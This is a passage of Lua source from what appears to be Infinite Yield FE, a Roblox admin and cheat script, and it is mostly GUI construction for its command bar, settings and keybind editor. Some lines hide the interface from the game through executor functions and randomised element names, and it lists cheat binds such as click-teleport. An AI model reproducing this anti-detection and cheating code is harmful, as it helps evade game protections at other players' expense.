		Dark_2 = Instance.new("Frame")
		Img = Instance.new("ImageButton")
		AddPlugin = Instance.new("TextButton")
		FileName = Instance.new("TextBox")
		About = Instance.new("TextLabel")
		Directions_2 = Instance.new("TextLabel")
		shadow_3 = Instance.new("Frame")
		PopupText_3 = Instance.new("TextLabel")
		Exit_3 = Instance.new("TextButton")
		ExitImage_3 = Instance.new("ImageLabel")
		AliasHint = Instance.new("TextLabel")
		PluginsHint = Instance.new("TextLabel")
		PositionsHint = Instance.new("TextLabel")
		ToPartFrame = Instance.new("Frame")
		background_4 = Instance.new("Frame")
		ChoosePart = Instance.new("TextButton")
		CopyPath = Instance.new("TextButton")
		Directions_3 = Instance.new("TextLabel")
		Path = Instance.new("TextLabel")
		shadow_4 = Instance.new("Frame")
		PopupText_5 = Instance.new("TextLabel")
		Exit_4 = Instance.new("TextButton")
		ExitImage_5 = Instance.new("ImageLabel")
		logs = Instance.new("Frame")
		shadow = Instance.new("Frame")
		Hide = Instance.new("TextButton")
		ImageLabel = Instance.new("ImageLabel")
		PopupText = Instance.new("TextLabel")
		Exit = Instance.new("TextButton")
		ImageLabel_2 = Instance.new("ImageLabel")
		background = Instance.new("Frame")
		chat = Instance.new("Frame")
		Clear = Instance.new("TextButton")
		SaveChatlogs = Instance.new("TextButton")
		Toggle = Instance.new("TextButton")
		scroll_2 = Instance.new("ScrollingFrame")
		join = Instance.new("Frame")
		Toggle_2 = Instance.new("TextButton")
		Clear_2 = Instance.new("TextButton")
		scroll_3 = Instance.new("ScrollingFrame")
		listlayout = Instance.new("UIListLayout",scroll_3)
		selectChat = Instance.new("TextButton")
		selectJoin = Instance.new("TextButton")
	
		function randomString()
			local length = math.random(10,20)
			local array = {}
			for i = 1, length do
				array[i] = string.char(math.random(32, 126))
			end
			return table.concat(array)
		end
	
		PARENT = nil
		if get_hidden_gui or gethui then
			local hiddenUI = get_hidden_gui or gethui
			local Main = Instance.new("ScreenGui")
			Main.Name = randomString()
			Main.Parent = hiddenUI()
			PARENT = Main
		elseif (not is_sirhurt_closure) and (syn and syn.protect_gui) then
			local Main = Instance.new("ScreenGui")
			Main.Name = randomString()
			syn.protect_gui(Main)
			Main.Parent = COREGUI
			PARENT = Main
		elseif COREGUI:FindFirstChild("RobloxGui") then
			PARENT = COREGUI.RobloxGui
		else
			local Main = Instance.new("ScreenGui")
			Main.Name = randomString()
			Main.Parent = COREGUI
			PARENT = Main
		end
	
		shade1 = {}
		shade2 = {}
		shade3 = {}
		text1 = {}
		text2 = {}
		scroll = {}
	
		ScaledHolder.Name = randomString()
		ScaledHolder.Size = UDim2.fromScale(1, 1)
		ScaledHolder.BackgroundTransparency = 1
		ScaledHolder.Parent = PARENT
		Scale.Name = randomString()
	
		Holder.Name = randomString()
		Holder.Parent = ScaledHolder
		Holder.Active = true
		Holder.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Holder.BorderSizePixel = 0
		Holder.Position = UDim2.new(1, -250, 1, -220)
		Holder.Size = UDim2.new(0, 250, 0, 220)
		Holder.ZIndex = 10
		table.insert(shade2,Holder)
	
		Title.Name = "Title"
		Title.Parent = Holder
		Title.Active = true
		Title.BackgroundColor3 = Color3.fromRGB(36,36,37)
		Title.BorderSizePixel = 0
		Title.Size = UDim2.new(0, 250, 0, 20)
		Title.Font = Enum.Font.SourceSans
		Title.TextSize = 18
		Title.Text = "Infinite Yield FE v" .. currentVersion
	
		do
			local emoji = ({
				["01 01"] = "🎆",
				[(function(Year)
					local A = math.floor(Year/100)
					local B = math.floor((13+8*A)/25)
					local C = (15-B+A-math.floor(A/4))%30
					local D = (4+A-math.floor(A/4))%7
					local E = (19*(Year%19)+C)%30
					local F = (2*(Year%4)+4*(Year%7)+6*E+D)%7
					local G = (22+E+F)
					if E == 29 and F == 6 then
						return "04 19"
					elseif E == 28 and F == 6 then
						return "04 18"
					elseif 31 < G then
						return ("04 %02d"):format(G-31)
					end
					return ("03 %02d"):format(G)
				end)(tonumber(os.date"%Y"))] = "🥚",
				["10 31"] = "🎃",
				["12 25"] = "🎄"
			})[os.date("%m %d")]
			if emoji then
				Title.Text = ("%s %s %s"):format(emoji, Title.Text, emoji)
			end
		end
	
		Title.TextColor3 = Color3.new(1, 1, 1)
		Title.ZIndex = 10
		table.insert(shade1,Title)
		table.insert(text1,Title)
	
		Dark.Name = "Dark"
		Dark.Parent = Holder
		Dark.Active = true
		Dark.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		Dark.BorderSizePixel = 0
		Dark.Position = UDim2.new(0, 0, 0, 45)
		Dark.Size = UDim2.new(0, 250, 0, 175)
		Dark.ZIndex = 10
		table.insert(shade1,Dark)
	
		Cmdbar.Name = "Cmdbar"
		Cmdbar.Parent = Holder
		Cmdbar.BackgroundTransparency = 1
		Cmdbar.BorderSizePixel = 0
		Cmdbar.Position = UDim2.new(0, 5, 0, 20)
		Cmdbar.Size = UDim2.new(0, 240, 0, 25)
		Cmdbar.Font = Enum.Font.SourceSans
		Cmdbar.TextSize = 18
		Cmdbar.TextXAlignment = Enum.TextXAlignment.Left
		Cmdbar.TextColor3 = Color3.new(1, 1, 1)
		Cmdbar.Text = ""
		Cmdbar.ZIndex = 10
		Cmdbar.PlaceholderText = "Command Bar"
	
		CMDsF.Name = "CMDs"
		CMDsF.Parent = Holder
		CMDsF.BackgroundTransparency = 1
		CMDsF.BorderSizePixel = 0
		CMDsF.Position = UDim2.new(0, 5, 0, 45)
		CMDsF.Size = UDim2.new(0, 245, 0, 175)
		CMDsF.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
		CMDsF.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
		CMDsF.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		CMDsF.ScrollBarThickness = 8
		CMDsF.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		CMDsF.VerticalScrollBarInset = 'Always'
		CMDsF.ZIndex = 10
		table.insert(scroll,CMDsF)
	
		cmdListLayout.Parent = CMDsF
	
		SettingsButton.Name = "SettingsButton"
		SettingsButton.Parent = Holder
		SettingsButton.BackgroundTransparency = 1
		SettingsButton.Position = UDim2.new(0, 230, 0, 0)
		SettingsButton.Size = UDim2.new(0, 20, 0, 20)
		SettingsButton.Image = getcustomasset("infiniteyield/assets/settings.png")
		SettingsButton.ZIndex = 10
	
		ReferenceButton = Instance.new("ImageButton")
		ReferenceButton.Name = "ReferenceButton"
		ReferenceButton.Parent = Holder
		ReferenceButton.BackgroundTransparency = 1
		ReferenceButton.Position = UDim2.new(0, 212, 0, 2)
		ReferenceButton.Size = UDim2.new(0, 16, 0, 16)
		ReferenceButton.Image = getcustomasset("infiniteyield/assets/reference.png")
		ReferenceButton.ZIndex = 10
	
		Settings.Name = "Settings"
		Settings.Parent = Holder
		Settings.Active = true
		Settings.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		Settings.BorderSizePixel = 0
		Settings.Position = UDim2.new(0, 0, 0, 220)
		Settings.Size = UDim2.new(0, 250, 0, 175)
		Settings.ZIndex = 10
		table.insert(shade1,Settings)
	
		SettingsHolder = Instance.new("ScrollingFrame")
		SettingsHolder.Name = "Holder"
		SettingsHolder.Parent = Settings
		SettingsHolder.BackgroundTransparency = 1
		SettingsHolder.BorderSizePixel = 0
		SettingsHolder.Size = UDim2.new(1,0,1,0)
		SettingsHolder.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
		SettingsHolder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		SettingsHolder.CanvasSize = UDim2.new(0, 0, 0, 235)
		SettingsHolder.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		SettingsHolder.ScrollBarThickness = 8
		SettingsHolder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		SettingsHolder.VerticalScrollBarInset = 'Always'
		SettingsHolder.ZIndex = 10
		table.insert(scroll,SettingsHolder)
	
		Prefix.Name = "Prefix"
		Prefix.Parent = SettingsHolder
		Prefix.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Prefix.BorderSizePixel = 0
		Prefix.BackgroundTransparency = 1
		Prefix.Position = UDim2.new(0, 5, 0, 5)
		Prefix.Size = UDim2.new(1, -10, 0, 20)
		Prefix.Font = Enum.Font.SourceSans
		Prefix.TextSize = 14
		Prefix.Text = "Prefix"
		Prefix.TextColor3 = Color3.new(1, 1, 1)
		Prefix.TextXAlignment = Enum.TextXAlignment.Left
		Prefix.ZIndex = 10
		table.insert(shade2,Prefix)
		table.insert(text1,Prefix)
	
		PrefixBox.Name = "PrefixBox"
		PrefixBox.Parent = Prefix
		PrefixBox.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		PrefixBox.BorderSizePixel = 0
		PrefixBox.Position = UDim2.new(1, -20, 0, 0)
		PrefixBox.Size = UDim2.new(0, 20, 0, 20)
		PrefixBox.Font = Enum.Font.SourceSansBold
		PrefixBox.TextSize = 14
		PrefixBox.Text = ''
		PrefixBox.TextColor3 = Color3.new(0, 0, 0)
		PrefixBox.ZIndex = 10
		table.insert(shade3,PrefixBox)
		table.insert(text2,PrefixBox)
	
		function makeSettingsButton(name,iconID,off)
			local button = Instance.new("TextButton")
			button.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
			button.BorderSizePixel = 0
			button.Position = UDim2.new(0,0,0,0)
			button.Size = UDim2.new(1,0,0,25)
			button.Text = ""
			button.ZIndex = 10
			local icon = Instance.new("ImageLabel")
			icon.Name = "Icon"
			icon.Parent = button
			icon.Position = UDim2.new(0,5,0,5)
			icon.Size = UDim2.new(0,16,0,16)
			icon.BackgroundTransparency = 1
			icon.Image = iconID
			icon.ZIndex = 10
			if off then
				icon.ScaleType = Enum.ScaleType.Crop
				icon.ImageRectSize = Vector2.new(16,16)
				icon.ImageRectOffset = Vector2.new(off,0)
			end
			local label = Instance.new("TextLabel")
			label.Name = "ButtonLabel"
			label.Parent = button
			label.BackgroundTransparency = 1
			label.Text = name
			label.Position = UDim2.new(0,28,0,0)
			label.Size = UDim2.new(1,-28,1,0)
			label.Font = Enum.Font.SourceSans
			label.TextColor3 = Color3.new(1, 1, 1)
			label.TextSize = 14
			label.ZIndex = 10
			label.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(shade2,button)
			table.insert(text1,label)
			return button
		end
	
		ColorsButton = makeSettingsButton("Edit Theme",getcustomasset("infiniteyield/assets/edittheme.png"))
		ColorsButton.Position = UDim2.new(0, 5, 0, 55)
		ColorsButton.Size = UDim2.new(1, -10, 0, 25)
		ColorsButton.Name = "Colors"
		ColorsButton.Parent = SettingsHolder
	
		Keybinds = makeSettingsButton("Edit Keybinds",getcustomasset("infiniteyield/assets/editkeybinds.png"))
		Keybinds.Position = UDim2.new(0, 5, 0, 85)
		Keybinds.Size = UDim2.new(1, -10, 0, 25)
		Keybinds.Name = "Keybinds"
		Keybinds.Parent = SettingsHolder
	
		Aliases = makeSettingsButton("Edit Aliases",getcustomasset("infiniteyield/assets/editaliases.png"))
		Aliases.Position = UDim2.new(0, 5, 0, 115)
		Aliases.Size = UDim2.new(1, -10, 0, 25)
		Aliases.Name = "Aliases"
		Aliases.Parent = SettingsHolder
	
		StayOpen.Name = "StayOpen"
		StayOpen.Parent = SettingsHolder
		StayOpen.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		StayOpen.BorderSizePixel = 0
		StayOpen.BackgroundTransparency = 1
		StayOpen.Position = UDim2.new(0, 5, 0, 30)
		StayOpen.Size = UDim2.new(1, -10, 0, 20)
		StayOpen.Font = Enum.Font.SourceSans
		StayOpen.TextSize = 14
		StayOpen.Text = "Keep Menu Open"
		StayOpen.TextColor3 = Color3.new(1, 1, 1)
		StayOpen.TextXAlignment = Enum.TextXAlignment.Left
		StayOpen.ZIndex = 10
		table.insert(shade2,StayOpen)
		table.insert(text1,StayOpen)
	
		Button.Name = "Button"
		Button.Parent = StayOpen
		Button.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Button.BorderSizePixel = 0
		Button.Position = UDim2.new(1, -20, 0, 0)
		Button.Size = UDim2.new(0, 20, 0, 20)
		Button.ZIndex = 10
		table.insert(shade3,Button)
	
		On.Name = "On"
		On.Parent = Button
		On.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
		On.BackgroundTransparency = 1
		On.BorderSizePixel = 0
		On.Position = UDim2.new(0, 2, 0, 2)
		On.Size = UDim2.new(0, 16, 0, 16)
		On.Font = Enum.Font.SourceSans
		On.FontSize = Enum.FontSize.Size14
		On.Text = ""
		On.TextColor3 = Color3.new(0, 0, 0)
		On.ZIndex = 10
	
		Positions = makeSettingsButton("Edit/Goto Waypoints",getcustomasset("infiniteyield/assets/editwaypoints.png"))
		Positions.Position = UDim2.new(0, 5, 0, 145)
		Positions.Size = UDim2.new(1, -10, 0, 25)
		Positions.Name = "Waypoints"
		Positions.Parent = SettingsHolder
	
		EventBind = makeSettingsButton("Edit Event Binds",getcustomasset("infiniteyield/assets/bindsandplugins.png"),759)
		EventBind.Position = UDim2.new(0, 5, 0, 205)
		EventBind.Size = UDim2.new(1, -10, 0, 25)
		EventBind.Name = "EventBinds"
		EventBind.Parent = SettingsHolder
	
		Plugins = makeSettingsButton("Manage Plugins",getcustomasset("infiniteyield/assets/bindsandplugins.png"),743)
		Plugins.Position = UDim2.new(0, 5, 0, 175)
		Plugins.Size = UDim2.new(1, -10, 0, 25)
		Plugins.Name = "Plugins"
		Plugins.Parent = SettingsHolder
	
		Example.Name = "Example"
		Example.Parent = Holder
		Example.BackgroundTransparency = 1
		Example.BorderSizePixel = 0
		Example.Size = UDim2.new(0, 190, 0, 20)
		Example.Visible = false
		Example.Font = Enum.Font.SourceSans
		Example.TextSize = 18
		Example.Text = "Example"
		Example.TextColor3 = Color3.new(1, 1, 1)
		Example.TextXAlignment = Enum.TextXAlignment.Left
		Example.ZIndex = 10
		table.insert(text1,Example)
	
		Notification.Name = randomString()
		Notification.Parent = ScaledHolder
		Notification.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		Notification.BorderSizePixel = 0
		Notification.Position = UDim2.new(1, -500, 1, 20)
		Notification.Size = UDim2.new(0, 250, 0, 100)
		Notification.ZIndex = 10
		table.insert(shade1,Notification)
	
		Title_2.Name = "Title"
		Title_2.Parent = Notification
		Title_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Title_2.BorderSizePixel = 0
		Title_2.Size = UDim2.new(0, 250, 0, 20)
		Title_2.Font = Enum.Font.SourceSans
		Title_2.TextSize = 14
		Title_2.Text = "Notification Title"
		Title_2.TextColor3 = Color3.new(1, 1, 1)
		Title_2.ZIndex = 10
		table.insert(shade2,Title_2)
		table.insert(text1,Title_2)
	
		Text_2.Name = "Text"
		Text_2.Parent = Notification
		Text_2.BackgroundTransparency = 1
		Text_2.BorderSizePixel = 0
		Text_2.Position = UDim2.new(0, 5, 0, 25)
		Text_2.Size = UDim2.new(0, 240, 0, 75)
		Text_2.Font = Enum.Font.SourceSans
		Text_2.TextSize = 16
		Text_2.Text = "Notification Text"
		Text_2.TextColor3 = Color3.new(1, 1, 1)
		Text_2.TextWrapped = true
		Text_2.ZIndex = 10
		table.insert(text1,Text_2)
	
		CloseButton.Name = "CloseButton"
		CloseButton.Parent = Notification
		CloseButton.BackgroundTransparency = 1
		CloseButton.Position = UDim2.new(1, -20, 0, 0)
		CloseButton.Size = UDim2.new(0, 20, 0, 20)
		CloseButton.Text = ""
		CloseButton.ZIndex = 10
	
		CloseImage.Parent = CloseButton
		CloseImage.BackgroundColor3 = Color3.new(1, 1, 1)
		CloseImage.BackgroundTransparency = 1
		CloseImage.Position = UDim2.new(0, 5, 0, 5)
		CloseImage.Size = UDim2.new(0, 10, 0, 10)
		CloseImage.Image = getcustomasset("infiniteyield/assets/close.png")
		CloseImage.ZIndex = 10
	
		PinButton.Name = "PinButton"
		PinButton.Parent = Notification
		PinButton.BackgroundTransparency = 1
		PinButton.Size = UDim2.new(0, 20, 0, 20)
		PinButton.ZIndex = 10
		PinButton.Text = ""
	
		PinImage.Parent = PinButton
		PinImage.BackgroundColor3 = Color3.new(1, 1, 1)
		PinImage.BackgroundTransparency = 1
		PinImage.Position = UDim2.new(0, 3, 0, 3)
		PinImage.Size = UDim2.new(0, 14, 0, 14)
		PinImage.ZIndex = 10
		PinImage.Image = getcustomasset("infiniteyield/assets/pin.png")
	
		Tooltip.Name = randomString()
		Tooltip.Parent = ScaledHolder
		Tooltip.Active = true
		Tooltip.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		Tooltip.BackgroundTransparency = 0.1
		Tooltip.BorderSizePixel = 0
		Tooltip.Size = UDim2.new(0, 200, 0, 96)
		Tooltip.Visible = false
		Tooltip.ZIndex = 10
		table.insert(shade1,Tooltip)
	
		Title_3.Name = "Title"
		Title_3.Parent = Tooltip
		Title_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Title_3.BackgroundTransparency = 0.1
		Title_3.BorderSizePixel = 0
		Title_3.Size = UDim2.new(0, 200, 0, 20)
		Title_3.Font = Enum.Font.SourceSans
		Title_3.TextSize = 14
		Title_3.Text = ""
		Title_3.TextColor3 = Color3.new(1, 1, 1)
		Title_3.TextTransparency = 0.1
		Title_3.ZIndex = 10
		table.insert(shade2,Title_3)
		table.insert(text1,Title_3)
	
		Description.Name = "Description"
		Description.Parent = Tooltip
		Description.BackgroundTransparency = 1
		Description.BorderSizePixel = 0
		Description.Size = UDim2.new(0,180,0,72)
		Description.Position = UDim2.new(0,10,0,18)
		Description.Font = Enum.Font.SourceSans
		Description.TextSize = 16
		Description.Text = ""
		Description.TextColor3 = Color3.new(1, 1, 1)
		Description.TextTransparency = 0.1
		Description.TextWrapped = true
		Description.ZIndex = 10
		table.insert(text1,Description)
	
		IntroBackground.Name = "IntroBackground"
		IntroBackground.Parent = Holder
		IntroBackground.Active = true
		IntroBackground.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		IntroBackground.BorderSizePixel = 0
		IntroBackground.Position = UDim2.new(0, 0, 0, 45)
		IntroBackground.Size = UDim2.new(0, 250, 0, 175)
		IntroBackground.ZIndex = 10
	
		Logo.Name = "Logo"
		Logo.Parent = Holder
		Logo.BackgroundTransparency = 1
		Logo.BorderSizePixel = 0
		Logo.Position = UDim2.new(0, 125, 0, 127)
		Logo.Size = UDim2.new(0, 10, 0, 10)
		Logo.Image = getcustomasset("infiniteyield/assets/logo.png")
		Logo.ImageTransparency = 0
		Logo.ZIndex = 10
	
		Credits.Name = "Credits"
		Credits.Parent = Holder
		Credits.BackgroundTransparency = 1
		Credits.BorderSizePixel = 0
		Credits.Position = UDim2.new(0, 0, 0.9, 30)
		Credits.Size = UDim2.new(0, 250, 0, 20)
		Credits.Font = Enum.Font.SourceSansLight
		Credits.FontSize = Enum.FontSize.Size14
		Credits.Text = "Edge // Zwolf // Moon // Toon // Peyton // ATP"
		Credits.TextColor3 = Color3.new(1, 1, 1)
		Credits.ZIndex = 10
	
		KeybindsFrame.Name = "KeybindsFrame"
		KeybindsFrame.Parent = Settings
		KeybindsFrame.Active = true
		KeybindsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		KeybindsFrame.BorderSizePixel = 0
		KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
		KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)
		KeybindsFrame.ZIndex = 10
		table.insert(shade1,KeybindsFrame)
	
		Close.Name = "Close"
		Close.Parent = KeybindsFrame
		Close.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Close.BorderSizePixel = 0
		Close.Position = UDim2.new(0, 205, 0, 150)
		Close.Size = UDim2.new(0, 40, 0, 20)
		Close.Font = Enum.Font.SourceSans
		Close.TextSize = 14
		Close.Text = "Close"
		Close.TextColor3 = Color3.new(1, 1, 1)
		Close.ZIndex = 10
		table.insert(shade2,Close)
		table.insert(text1,Close)
	
		Add.Name = "Add"
		Add.Parent = KeybindsFrame
		Add.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Add.BorderSizePixel = 0
		Add.Position = UDim2.new(0, 5, 0, 150)
		Add.Size = UDim2.new(0, 40, 0, 20)
		Add.Font = Enum.Font.SourceSans
		Add.TextSize = 14
		Add.Text = "Add"
		Add.TextColor3 = Color3.new(1, 1, 1)
		Add.ZIndex = 10
		table.insert(shade2,Add)
		table.insert(text1,Add)
	
		Delete.Name = "Delete"
		Delete.Parent = KeybindsFrame
		Delete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Delete.BorderSizePixel = 0
		Delete.Position = UDim2.new(0, 50, 0, 150)
		Delete.Size = UDim2.new(0, 40, 0, 20)
		Delete.Font = Enum.Font.SourceSans
		Delete.TextSize = 14
		Delete.Text = "Clear"
		Delete.TextColor3 = Color3.new(1, 1, 1)
		Delete.ZIndex = 10
		table.insert(shade2,Delete)
		table.insert(text1,Delete)
	
		Holder_2.Name = "Holder"
		Holder_2.Parent = KeybindsFrame
		Holder_2.BackgroundTransparency = 1
		Holder_2.BorderSizePixel = 0
		Holder_2.Position = UDim2.new(0, 0, 0, 0)
		Holder_2.Size = UDim2.new(0, 250, 0, 145)
		Holder_2.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
		Holder_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
		Holder_2.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_2.ScrollBarThickness = 0
		Holder_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_2.VerticalScrollBarInset = 'Always'
		Holder_2.ZIndex = 10
	
		Example_2.Name = "Example"
		Example_2.Parent = KeybindsFrame
		Example_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Example_2.BorderSizePixel = 0
		Example_2.Size = UDim2.new(0, 10, 0, 20)
		Example_2.Visible = false
		Example_2.ZIndex = 10
		table.insert(shade2,Example_2)
	
		Text_3.Name = "Text"
		Text_3.Parent = Example_2
		Text_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Text_3.BorderSizePixel = 0
		Text_3.Position = UDim2.new(0, 10, 0, 0)
		Text_3.Size = UDim2.new(0, 240, 0, 20)
		Text_3.Font = Enum.Font.SourceSans
		Text_3.TextSize = 14
		Text_3.Text = "nom"
		Text_3.TextColor3 = Color3.new(1, 1, 1)
		Text_3.TextXAlignment = Enum.TextXAlignment.Left
		Text_3.ZIndex = 10
		table.insert(shade2,Text_3)
		table.insert(text1,Text_3)
	
		Delete_2.Name = "Delete"
		Delete_2.Parent = Text_3
		Delete_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Delete_2.BorderSizePixel = 0
		Delete_2.Position = UDim2.new(0, 200, 0, 0)
		Delete_2.Size = UDim2.new(0, 40, 0, 20)
		Delete_2.Font = Enum.Font.SourceSans
		Delete_2.TextSize = 14
		Delete_2.Text = "Delete"
		Delete_2.TextColor3 = Color3.new(0, 0, 0)
		Delete_2.ZIndex = 10
		table.insert(shade3,Delete_2)
		table.insert(text2,Delete_2)
	
		KeybindEditor.Name = randomString()
		KeybindEditor.Parent = ScaledHolder
		KeybindEditor.Active = true
		KeybindEditor.BackgroundTransparency = 1
		KeybindEditor.Position = UDim2.new(0.5, -180, 0, -500)
		KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
		KeybindEditor.ZIndex = 10
	
		background_2.Name = "background"
		background_2.Parent = KeybindEditor
		background_2.Active = true
		background_2.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		background_2.BorderSizePixel = 0
		background_2.Position = UDim2.new(0, 0, 0, 20)
		background_2.Size = UDim2.new(0, 360, 0, 185)
		background_2.ZIndex = 10
		table.insert(shade1,background_2)
	
		Dark_3.Name = "Dark"
		Dark_3.Parent = background_2
		Dark_3.Active = true
		Dark_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Dark_3.BorderSizePixel = 0
		Dark_3.Position = UDim2.new(0, 135, 0, 0)
		Dark_3.Size = UDim2.new(0, 2, 0, 185)
		Dark_3.ZIndex = 10
		table.insert(shade2,Dark_3)
	
		Directions.Name = "Directions"
		Directions.Parent = background_2
		Directions.BackgroundTransparency = 1
		Directions.BorderSizePixel = 0
		Directions.Position = UDim2.new(0, 10, 0, 15)
		Directions.Size = UDim2.new(0, 115, 0, 90)
		Directions.ZIndex = 10
		Directions.Font = Enum.Font.SourceSans
		Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
		Directions.TextColor3 = Color3.fromRGB(255, 255, 255)
		Directions.TextSize = 14.000
		Directions.TextWrapped = true
		Directions.TextYAlignment = Enum.TextYAlignment.Top
		table.insert(text1,Directions)
	
		BindTo.Name = "BindTo"
		BindTo.Parent = background_2
		BindTo.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		BindTo.BorderSizePixel = 0
		BindTo.Position = UDim2.new(0, 10, 0, 95)
		BindTo.Size = UDim2.new(0, 115, 0, 50)
		BindTo.ZIndex = 10
		BindTo.Font = Enum.Font.SourceSans
		BindTo.Text = "Click to bind"
		BindTo.TextColor3 = Color3.fromRGB(255, 255, 255)
		BindTo.TextSize = 16.000
		table.insert(shade2,BindTo)
		table.insert(text1,BindTo)
	
		TriggerLabel.Name = "TriggerLabel"
		TriggerLabel.Parent = background_2
		TriggerLabel.BackgroundTransparency = 1
		TriggerLabel.Position = UDim2.new(0, 10, 0, 155)
		TriggerLabel.Size = UDim2.new(0, 45, 0, 20)
		TriggerLabel.ZIndex = 10
		TriggerLabel.Font = Enum.Font.SourceSans
		TriggerLabel.Text = "Trigger:"
		TriggerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TriggerLabel.TextSize = 14.000
		TriggerLabel.TextXAlignment = Enum.TextXAlignment.Left
		table.insert(text1,TriggerLabel)
	
		BindTriggerSelect.Name = "BindTo"
		BindTriggerSelect.Parent = background_2
		BindTriggerSelect.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		BindTriggerSelect.BorderSizePixel = 0
		BindTriggerSelect.Position = UDim2.new(0, 60, 0, 155)
		BindTriggerSelect.Size = UDim2.new(0, 65, 0, 20)
		BindTriggerSelect.ZIndex = 10
		BindTriggerSelect.Font = Enum.Font.SourceSans
		BindTriggerSelect.Text = "KeyDown"
		BindTriggerSelect.TextColor3 = Color3.fromRGB(255, 255, 255)
		BindTriggerSelect.TextSize = 16.000
		table.insert(shade2,BindTriggerSelect)
		table.insert(text1,BindTriggerSelect)
	
		Add_2.Name = "Add"
		Add_2.Parent = background_2
		Add_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Add_2.BorderSizePixel = 0
		Add_2.Position = UDim2.new(0, 310, 0, 35)
		Add_2.Size = UDim2.new(0, 40, 0, 20)
		Add_2.ZIndex = 10
		Add_2.Font = Enum.Font.SourceSans
		Add_2.Text = "Add"
		Add_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		Add_2.TextSize = 14.000
		table.insert(shade2,Add_2)
		table.insert(text1,Add_2)
	
		Toggles.Name = "Toggles"
		Toggles.Parent = background_2
		Toggles.BackgroundTransparency = 1
		Toggles.BorderSizePixel = 0
		Toggles.Position = UDim2.new(0, 150, 0, 125)
		Toggles.Size = UDim2.new(0, 200, 0, 50)
		Toggles.ZIndex = 10
		Toggles.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Toggles.CanvasSize = UDim2.new(0, 0, 0, 50)
		Toggles.ScrollBarThickness = 8
		Toggles.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Toggles.VerticalScrollBarInset = Enum.ScrollBarInset.Always
		table.insert(scroll,Toggles)
	
		ClickTP.Name = "Click TP (Hold Key & Click)"
		ClickTP.Parent = Toggles
		ClickTP.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		ClickTP.BorderSizePixel = 0
		ClickTP.Size = UDim2.new(0, 200, 0, 20)
		ClickTP.ZIndex = 10
		ClickTP.Font = Enum.Font.SourceSans
		ClickTP.Text = "    Click TP (Hold Key & Click)"
		ClickTP.TextColor3 = Color3.fromRGB(255, 255, 255)
		ClickTP.TextSize = 14.000
		ClickTP.TextXAlignment = Enum.TextXAlignment.Left
		table.insert(shade2,ClickTP)
		table.insert(text1,ClickTP)
	
		Select.Name = "Select"
		Select.Parent = ClickTP
		Select.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Select.BorderSizePixel = 0
		Select.Position = UDim2.new(0, 160, 0, 0)
		Select.Size = UDim2.new(0, 40, 0, 20)
		Select.ZIndex = 10
		Select.Font = Enum.Font.SourceSans
		Select.Text = "Add"
		Select.TextColor3 = Color3.fromRGB(0, 0, 0)
		Select.TextSize = 14.000
		table.insert(shade3,Select)
		table.insert(text2,Select)
	
		ClickDelete.Name = "Click Delete (Hold Key & Click)"
		ClickDelete.Parent = Toggles
		ClickDelete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		ClickDelete.BorderSizePixel = 0
		ClickDelete.Position = UDim2.new(0, 0, 0, 25)
		ClickDelete.Size = UDim2.new(0, 200, 0, 20)
		ClickDelete.ZIndex = 10
		ClickDelete.Font = Enum.Font.SourceSans
		ClickDelete.Text = "    Click Delete (Hold Key & Click)"
		ClickDelete.TextColor3 = Color3.fromRGB(255, 255, 255)
		ClickDelete.TextSize = 14.000
		ClickDelete.TextXAlignment = Enum.TextXAlignment.Left
		table.insert(shade2,ClickDelete)
		table.insert(text1,ClickDelete)
	
		Select_2.Name = "Select"
		Select_2.Parent = ClickDelete
		Select_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Select_2.BorderSizePixel = 0
